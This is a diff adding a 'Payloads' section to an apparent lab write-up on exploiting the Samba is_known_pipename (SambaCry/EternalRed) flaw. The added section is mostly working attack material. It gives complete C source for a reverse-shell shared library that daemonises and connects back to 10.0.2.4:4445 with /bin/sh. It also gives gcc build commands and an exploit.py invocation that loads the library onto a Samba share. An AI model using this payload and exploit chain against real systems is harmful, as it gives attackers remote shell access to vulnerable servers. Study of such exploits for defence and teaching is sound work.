@@ -138,3 +138,98 @@ Here we can see that the exploit executed, the uname -a run, and we got back a c
 We can set the -r parameter for the full path of the payload and it should work... for this version. After investigating the metasploit version [is_known_pipename](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/samba/is_known_pipename.rb), I found that it wil try not just the full path, but full path with added "\\\\PIPE\\". 
 It looks like a few version needs this string before the path to work. In case the exploit did not worked, it is possible that "\\\\PIPE\\/sharename/file.so" could work as parameter -r.
 
+<h2>Payloads</h2>
+We have our bindshell as payload. It is really nice but let's say it is not enought. From now on we will loke at multiple type of payload that we could execute.
+
+<h3>Reverse shell</h3>
+For this I grabbed the first reverseshell written in C that I could find. https://gist.github.com/0xabe-io/916cf3af33d1c0592a90
+Complie with gcc, run the exploit and fail. like really big fail. Looking at the  machine logs, it was clear what happened. Not any payload can be used here. Let's modify this reverse shell to make it work.
+![fail](/img/EternalRed/fail.png)
+
+Investigating the error and the already created bind shell a few thing must be done. First the smb will try to search for afunction named samba_init_module. This is where the execution will start. In case this function do not appear in the code, then
+the same error will hapen as on the picture. In the bindshell we can also see a detachFromParent() function. These should be implemented aswell to make sure that the exploit will not hang and the connection can be recieved.
+We only have one thing to add. That is the IP and the Port that we want to connect back. Here I checked my IP with ifconfig and added that as listening host and 4445 as listening port
+The final reverse shell code:
+
+```
+
+#include <stdio.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <stdlib.h>
+#include <sys/stat.h>
+
+
+#define REMOTE_ADDR "10.0.2.4"
+#define REMOTE_PORT 4445
+
+static void detachFromParent(void) {
+    pid_t pid, sid;
+
+    if ( getppid() == 1 ){
+        return;
+    }
+
+    pid = fork();
+
+    if (pid < 0) {
+        exit(EXIT_FAILURE);
+    }
+
+    if (pid > 0) {
+        exit(EXIT_SUCCESS);
+    }
+
+    umask(0);
+
+    sid = setsid();
+    if (sid < 0) {
+        exit(EXIT_FAILURE);
+    }
+
+    if ((chdir("/")) < 0) {
+        exit(EXIT_FAILURE);
+    }
+
+}
+
+int samba_init_module(void)
+{
+    detachFromParent();
+    struct sockaddr_in sa;
+    int s;
+
+    sa.sin_family = AF_INET;
+    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
+    sa.sin_port = htons(REMOTE_PORT);
+
+    s = socket(AF_INET, SOCK_STREAM, 0);
+    connect(s, (struct sockaddr *)&sa, sizeof(sa));
+    dup2(s, 0);
+    dup2(s, 1);
+    dup2(s, 2);
+
+    execve("/bin/sh", 0, 0);
+    return 0;
+}
+
+```
+
+Compile the exploit then run, we will get a reverse shell:
+
+```
+gcc -c -fpic reverse.c
+gcc -shared -o reverse.so reverse.o
+
+
+./exploit.py -t localhost -e reverse.so \
+             -s data -r /data/reverse.so \
+             -u sambacry -p nosambanocry
+			 
+```
+
+![reverseShell](/img/EternalRed/reverse.png)
+
+
